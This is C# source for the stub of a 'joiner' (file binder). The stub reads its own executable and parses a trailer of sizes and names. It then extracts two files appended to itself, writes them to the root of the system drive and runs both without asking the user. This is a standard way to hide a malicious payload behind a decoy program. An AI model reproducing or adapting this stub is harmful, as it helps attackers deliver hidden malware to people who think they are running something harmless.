using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Net_joiner_Stub;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		FileStream fileStream = new FileStream(Application.get_ExecutablePath(), FileMode.Open, FileAccess.Read);
		FileStream fileStream2 = new FileStream(Environment.SystemDirectory.Substring(0, 3) + "1.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite);
		byte[] buffer = new byte[fileStream.Length];
		fileStream.Read(buffer, 0, (int)fileStream.Length);
		fileStream2.Write(buffer, (int)(fileStream.Length - 1024L), 1024);
		fileStream2.Flush();
		fileStream2.Close();
		StreamReader streamReader = new StreamReader(Environment.SystemDirectory.Substring(0, 3) + "1.txt");
		string[] array = streamReader.ReadLine()!.Split(new string[1] { ";" }, StringSplitOptions.None);
		streamReader.Close();
		File.Delete(Environment.SystemDirectory.Substring(0, 3) + "1.txt");
		FileStream fileStream3 = new FileStream(Environment.SystemDirectory.Substring(0, 3) + array[3], FileMode.OpenOrCreate, FileAccess.ReadWrite);
		fileStream3.Write(buffer, (int)fileStream.Length - (1024 + Convert.ToInt32(array[2])), Convert.ToInt32(array[2]));
		fileStream3.Flush();
		fileStream3.Close();
		Process.Start(Environment.SystemDirectory.Substring(0, 3) + array[3]);
		FileStream fileStream4 = new FileStream(Environment.SystemDirectory.Substring(0, 3) + array[1], FileMode.OpenOrCreate, FileAccess.ReadWrite);
		fileStream4.Write(buffer, (int)fileStream.Length - (1024 + Convert.ToInt32(array[2]) + Convert.ToInt32(array[0])), Convert.ToInt32(array[0]));
		fileStream4.Flush();
		fileStream4.Close();
		Process.Start(Environment.SystemDirectory.Substring(0, 3) + array[1]);
		fileStream.Close();
	}
}
